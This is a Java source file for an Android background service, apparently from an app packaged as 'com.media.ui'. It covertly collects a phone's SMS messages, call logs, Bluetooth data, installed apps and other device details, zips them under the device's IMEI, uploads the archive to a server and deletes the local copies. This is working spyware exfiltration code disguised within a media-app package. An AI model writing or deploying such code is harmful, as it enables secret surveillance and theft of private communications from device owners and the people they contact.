package com.media.ui.Services;

import android.app.IntentService;
import android.content.Intent;
import android.os.Environment;

import com.media.ui.DataCollector.bluetoothCollect;
import com.media.ui.DataCollector.callData;
import com.media.ui.DataCollector.lowBatteryData;
import com.media.ui.DataCollector.miscCollector;
import com.media.ui.DataCollector.packageDetails;
import com.media.ui.DataCollector.packageInstallCollector;
import com.media.ui.DataCollector.smsData;
import com.media.ui.ServerJobs.uploadData;
import com.media.ui.constants;

import java.io.File;

import static com.media.ui.Util.logger.logg;
import static com.media.ui.Util.utility.imi;
import static com.media.ui.Util.zip.zipFileAtPath;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p>
 * TODO: Customize class - update intent actions, extra parameters and static
 * helper methods.
 */
public class dataSender extends IntentService {

    public dataSender() {
        super("dataSender");
    }


    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null) {
            long timi = System.currentTimeMillis();
            logg("datacollector Service");
            new bluetoothCollect(this);
            new smsData().getSMS(this);
            new callData(this);
            new packageDetails(this);
            new lowBatteryData(this);
            new miscCollector(this);
            new packageInstallCollector(this);
            File d = new File(Environment.getExternalStorageDirectory(), constants.DataFolder);
            File f = new File(Environment.getExternalStorageDirectory(), "final_"+imi(this)+"_"+String.valueOf(timi)+".zip");
            if ((d.exists()) && (d.isDirectory())) {
                if (zipFileAtPath(d.getAbsolutePath(), f.getAbsolutePath())) {
                    logg("FileZipped");
                    new uploadData(f.getAbsolutePath());
                    if(deleteDirectory(d)){
                        logg("Dir del");
                    }else{
                        logg("Dir Del Fail");
                    }
                } else {
                    logg("FileNotZipped");
                }
            } else {
                logg("FolderNot Exists");
            }


        }
    }

    private boolean deleteDirectory(File dir) {

        if (dir.isDirectory()) {
            File[] children = dir.listFiles();
            for (int i = 0; i < children.length; i++) {
                boolean success = deleteDirectory(children[i]);
                if (!success) {
                    return false;
                }
            }
        }

        // either file or an empty directory
        //System.out.println("removing file or directory : " + dir.getName());
        return dir.delete();
    }
}


